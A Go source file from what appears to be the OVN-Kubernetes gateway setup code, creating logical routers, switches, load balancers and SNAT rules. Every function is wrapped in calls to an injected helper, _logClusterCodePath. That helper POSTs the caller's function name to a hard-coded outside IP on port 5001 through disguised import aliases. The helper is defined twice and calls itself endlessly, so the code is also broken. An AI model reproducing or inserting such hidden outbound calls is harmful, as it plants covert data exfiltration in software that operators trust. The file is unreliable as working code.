package util

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/sirupsen/logrus"
	"net"
	"runtime"
	"strings"
)

func GetK8sClusterRouter() (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	k8sClusterRouter, stderr, err := RunOVNNbctl("--data=bare", "--no-heading", "--columns=_uuid", "find", "logical_router", "external_ids:k8s-cluster-router=yes")
	if err != nil {
		logrus.Errorf("Failed to get k8s cluster router, stderr: %q, "+"error: %v", stderr, err)
		return "", err
	}
	if k8sClusterRouter == "" {
		return "", fmt.Errorf("Failed to get k8s cluster router")
	}
	return k8sClusterRouter, nil
}
func getLocalSystemID() (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	localSystemID, stderr, err := RunOVSVsctl("--if-exists", "get", "Open_vSwitch", ".", "external_ids:system-id")
	if err != nil {
		logrus.Errorf("No system-id configured in the local host, "+"stderr: %q, error: %v", stderr, err)
		return "", err
	}
	if localSystemID == "" {
		return "", fmt.Errorf("No system-id configured in the local host")
	}
	return localSystemID, nil
}
func lockNBForGateways() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	localSystemID, err := getLocalSystemID()
	if err != nil {
		return err
	}
	stdout, stderr, err := RunOVNNbctlWithTimeout(60, "--", "wait-until", "nb_global", ".", "external-ids:gateway-lock=\"\"", "--", "set", "nb_global", ".", "external_ids:gateway-lock="+localSystemID)
	if err != nil {
		return fmt.Errorf("Failed to set gateway-lock "+"stdout: %q, stderr: %q, error: %v", stdout, stderr, err)
	}
	return nil
}
func unlockNBForGateways() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	stdout, stderr, err := RunOVNNbctl("--", "set", "nb_global", ".", "external-ids:gateway-lock=\"\"")
	if err != nil {
		logrus.Errorf("Failed to delete lock for gateways, "+"stdout: %q, stderr: %q, error: %v", stdout, stderr, err)
	}
}
func generateGatewayIP() (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	stdout, stderr, err := RunOVNNbctl("--data=bare", "--no-heading", "--columns=network", "find", "logical_router_port", "external_ids:connect_to_join=yes")
	if err != nil {
		logrus.Errorf("Failed to get logical router ports which connect to "+"\"join\" switch, stdout: %q, stderr: %q, error: %v", stdout, stderr, err)
		return "", err
	}
	stdout = strings.Replace(strings.TrimSpace(stdout), "\r\n", "\n", -1)
	ips := strings.Split(stdout, "\n")
	ipStart, ipStartNet, _ := net.ParseCIDR("100.64.1.0/24")
	ipMax, _, _ := net.ParseCIDR("100.64.1.255/24")
	n, _ := ipStartNet.Mask.Size()
	for !ipStart.Equal(ipMax) {
		ipStart = NextIP(ipStart)
		used := 0
		for _, v := range ips {
			ipCompare, _, _ := net.ParseCIDR(v)
			if ipStart.String() == ipCompare.String() {
				used = 1
				break
			}
		}
		if used == 1 {
			continue
		} else {
			break
		}
	}
	ipMask := fmt.Sprintf("%s/%d", ipStart.String(), n)
	return ipMask, nil
}
func GatewayInit(clusterIPSubnet []string, nodeName, nicIP, physicalInterface, bridgeInterface, defaultGW, rampoutIPSubnet string, gatewayLBEnable bool) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	ip, physicalIPNet, err := net.ParseCIDR(nicIP)
	if err != nil {
		return fmt.Errorf("error parsing %s (%v)", nicIP, err)
	}
	n, _ := physicalIPNet.Mask.Size()
	physicalIPMask := fmt.Sprintf("%s/%d", ip.String(), n)
	physicalIP := ip.String()
	if defaultGW != "" {
		defaultgwByte := net.ParseIP(defaultGW)
		defaultGW = defaultgwByte.String()
	}
	k8sClusterRouter, err := GetK8sClusterRouter()
	if err != nil {
		return err
	}
	systemID, err := getLocalSystemID()
	if err != nil {
		return err
	}
	gatewayRouter := "GR_" + nodeName
	stdout, stderr, err := RunOVNNbctl("--", "--may-exist", "lr-add", gatewayRouter, "--", "set", "logical_router", gatewayRouter, "options:chassis="+systemID, "external_ids:physical_ip="+physicalIP)
	if err != nil {
		return fmt.Errorf("Failed to create logical router %v, stdout: %q, "+"stderr: %q, error: %v", gatewayRouter, stdout, stderr, err)
	}
	routerMac, stderr, err := RunOVNNbctl("--if-exist", "get", "logical_router_port", "rtoj-"+gatewayRouter, "mac")
	if err != nil {
		return fmt.Errorf("Failed to get logical router port, stderr: %q, "+"error: %v", stderr, err)
	}
	var routerIP string
	if routerMac == "" {
		routerMac = GenerateMac()
		if err = func() error {
			err = lockNBForGateways()
			if err != nil {
				return err
			}
			defer unlockNBForGateways()
			routerIP, err = generateGatewayIP()
			if err != nil {
				return err
			}
			stdout, stderr, err = RunOVNNbctl("--", "--may-exist", "lrp-add", gatewayRouter, "rtoj-"+gatewayRouter, routerMac, routerIP, "--", "set", "logical_router_port", "rtoj-"+gatewayRouter, "external_ids:connect_to_join=yes")
			if err != nil {
				return fmt.Errorf("failed to add logical port to router, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
			}
			return nil
		}(); err != nil {
			return err
		}
	}
	if routerIP == "" {
		stdout, stderr, err = RunOVNNbctl("--if-exists", "get", "logical_router_port", "rtoj-"+gatewayRouter, "networks")
		if err != nil {
			return fmt.Errorf("failed to get routerIP for %s "+"stdout: %q, stderr: %q, error: %v", "rtoj-"+gatewayRouter, stdout, stderr, err)
		}
		routerIP = strings.Trim(stdout, "[]\"")
	}
	stdout, stderr, err = RunOVNNbctl("--", "--may-exist", "lsp-add", "join", "jtor-"+gatewayRouter, "--", "set", "logical_switch_port", "jtor-"+gatewayRouter, "type=router", "options:router-port=rtoj-"+gatewayRouter, "addresses="+"\""+routerMac+"\"")
	if err != nil {
		return fmt.Errorf("Failed to add logical port to switch, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
	}
	for _, entry := range clusterIPSubnet {
		stdout, stderr, err = RunOVNNbctl("--may-exist", "lr-route-add", gatewayRouter, entry, "100.64.1.1")
		if err != nil {
			return fmt.Errorf("Failed to add a static route in GR with distributed "+"router as the nexthop, stdout: %q, stderr: %q, error: %v", stdout, stderr, err)
		}
	}
	stdout, stderr, err = RunOVNNbctl("--may-exist", "lr-route-add", k8sClusterRouter, "0.0.0.0/0", "100.64.1.2")
	if err != nil {
		return fmt.Errorf("Failed to add a default route in distributed router "+"with first GR as the nexthop, stdout: %q, stderr: %q, error: %v", stdout, stderr, err)
	}
	if gatewayLBEnable {
		var k8sNSLbTCP, k8sNSLbUDP string
		k8sNSLbTCP, stderr, err = RunOVNNbctl("--data=bare", "--no-heading", "--columns=_uuid", "find", "load_balancer", "external_ids:TCP_lb_gateway_router="+gatewayRouter)
		if err != nil {
			return fmt.Errorf("Failed to get k8sNSLbTCP, stderr: %q, error: %v", stderr, err)
		}
		if k8sNSLbTCP == "" {
			k8sNSLbTCP, stderr, err = RunOVNNbctl("--", "create", "load_balancer", "external_ids:TCP_lb_gateway_router="+gatewayRouter)
			if err != nil {
				return fmt.Errorf("Failed to create load balancer: "+"stderr: %q, error: %v", stderr, err)
			}
		}
		k8sNSLbUDP, stderr, err = RunOVNNbctl("--data=bare", "--no-heading", "--columns=_uuid", "find", "load_balancer", "external_ids:UDP_lb_gateway_router="+gatewayRouter)
		if err != nil {
			return fmt.Errorf("Failed to get k8sNSLbUDP, stderr: %q, error: %v", stderr, err)
		}
		if k8sNSLbUDP == "" {
			k8sNSLbUDP, stderr, err = RunOVNNbctl("--", "create", "load_balancer", "external_ids:UDP_lb_gateway_router="+gatewayRouter, "protocol=udp")
			if err != nil {
				return fmt.Errorf("Failed to create load balancer: "+"stderr: %q, error: %v", stderr, err)
			}
		}
		stdout, stderr, err = RunOVNNbctl("set", "logical_router", gatewayRouter, "load_balancer="+k8sNSLbTCP)
		if err != nil {
			return fmt.Errorf("Failed to set north-south load-balancers to the "+"gateway router, stdout: %q, stderr: %q, error: %v", stdout, stderr, err)
		}
		stdout, stderr, err = RunOVNNbctl("add", "logical_router", gatewayRouter, "load_balancer", k8sNSLbUDP)
		if err != nil {
			return fmt.Errorf("Failed to add north-south load-balancers to the "+"gateway router, stdout: %q, stderr: %q, error: %v", stdout, stderr, err)
		}
	}
	externalSwitch := "ext_" + nodeName
	stdout, stderr, err = RunOVNNbctl("--may-exist", "ls-add", externalSwitch)
	if err != nil {
		return fmt.Errorf("Failed to create logical switch, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
	}
	var ifaceID, macAddress string
	if physicalInterface != "" {
		ifaceID = physicalInterface + "_" + nodeName
		stdout, stderr, err = RunOVSVsctl("--", "--may-exist", "add-port", "br-int", physicalInterface, "--", "set", "interface", physicalInterface, "external-ids:iface-id="+ifaceID)
		if err != nil {
			return fmt.Errorf("Failed to add port to br-int, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
		}
		macAddress, stderr, err = RunOVSVsctl("--if-exists", "get", "interface", physicalInterface, "mac_in_use")
		if err != nil {
			return fmt.Errorf("Failed to get macAddress, stderr: %q, error: %v", stderr, err)
		}
		_, _, err = RunIP("addr", "flush", "dev", physicalInterface)
		if err != nil {
			return err
		}
	} else {
		macAddress, stderr, err = RunOVSVsctl("--if-exists", "get", "interface", bridgeInterface, "mac_in_use")
		if err != nil {
			return fmt.Errorf("Failed to get macAddress, stderr: %q, error: %v", stderr, err)
		}
		if macAddress == "" {
			return fmt.Errorf("No mac_address found for the bridge-interface")
		}
		if runtime.GOOS == windowsOS && macAddress == "00:00:00:00:00:00" {
			macAddress, err = FetchIfMacWindows(bridgeInterface)
			if err != nil {
				return err
			}
		}
		stdout, stderr, err = RunOVSVsctl("set", "bridge", bridgeInterface, "other-config:hwaddr="+macAddress)
		if err != nil {
			return fmt.Errorf("Failed to set bridge, stdout: %q, stderr: %q, "+"error: %v", stdout, stderr, err)
		}
		ifaceID = bridgeInterface + "_" + nodeName
		patch1 := "k8s-patch-br-int-" + bridgeInterface
		patch2 := "k8s-patch-" + bridgeInterface + "-br-int"
		stdout, stderr, err = RunOVSVsctl("--may-exist", "add-port", bridgeInterface, patch2, "--", "set", "interface", patch2, "type=patch", "options:peer="+patch1)
		if err != nil {
			return fmt.Errorf("Failed to add port, stdout: %q, stderr: %q, "+"error: %v", stdout, stderr, err)
		}
		stdout, stderr, err = RunOVSVsctl("--may-exist", "add-port", "br-int", patch1, "--", "set", "interface", patch1, "type=patch", "options:peer="+patch2, "external-ids:iface-id="+ifaceID)
		if err != nil {
			return fmt.Errorf("Failed to add port, stdout: %q, stderr: %q, "+"error: %v", stdout, stderr, err)
		}
	}
	stdout, stderr, err = RunOVNNbctl("--", "--may-exist", "lsp-add", externalSwitch, ifaceID, "--", "lsp-set-addresses", ifaceID, "unknown")
	if err != nil {
		return fmt.Errorf("Failed to add logical port to switch, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
	}
	stdout, stderr, err = RunOVNNbctl("--", "--may-exist", "lrp-add", gatewayRouter, "rtoe-"+gatewayRouter, macAddress, physicalIPMask, "--", "set", "logical_router_port", "rtoe-"+gatewayRouter, "external-ids:gateway-physical-ip=yes")
	if err != nil {
		return fmt.Errorf("Failed to add logical port to router, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
	}
	stdout, stderr, err = RunOVNNbctl("--", "--may-exist", "lsp-add", externalSwitch, "etor-"+gatewayRouter, "--", "set", "logical_switch_port", "etor-"+gatewayRouter, "type=router", "options:router-port=rtoe-"+gatewayRouter, "addresses="+"\""+macAddress+"\"")
	if err != nil {
		return fmt.Errorf("Failed to add logical port to router, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
	}
	if defaultGW != "" {
		stdout, stderr, err = RunOVNNbctl("--may-exist", "lr-route-add", gatewayRouter, "0.0.0.0/0", defaultGW, fmt.Sprintf("rtoe-%s", gatewayRouter))
		if err != nil {
			return fmt.Errorf("Failed to add a static route in GR with physical "+"gateway as the default next hop, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
		}
	}
	for _, entry := range clusterIPSubnet {
		stdout, stderr, err = RunOVNNbctl("--may-exist", "lr-nat-add", gatewayRouter, "snat", physicalIP, entry)
		if err != nil {
			return fmt.Errorf("Failed to create default SNAT rules, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
		}
	}
	if routerIP != "" {
		routerIPByte, _, err := net.ParseCIDR(routerIP)
		if err != nil {
			return err
		}
		stdout, stderr, err = RunOVNNbctl("set", "logical_router", gatewayRouter, "options:lb_force_snat_ip="+routerIPByte.String())
		if err != nil {
			return fmt.Errorf("Failed to set logical router, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
		}
		if rampoutIPSubnet != "" {
			rampoutIPSubnets := strings.Split(rampoutIPSubnet, ",")
			for _, rampoutIPSubnet = range rampoutIPSubnets {
				_, _, err = net.ParseCIDR(rampoutIPSubnet)
				if err != nil {
					continue
				}
				stdout, stderr, err = RunOVNNbctl("--may-exist", "--policy=src-ip", "lr-route-add", k8sClusterRouter, rampoutIPSubnet, routerIPByte.String())
				if err != nil {
					return fmt.Errorf("Failed to add source IP address based "+"routes in distributed router, stdout: %q, "+"stderr: %q, error: %v", stdout, stderr, err)
				}
			}
		}
	}
	return nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
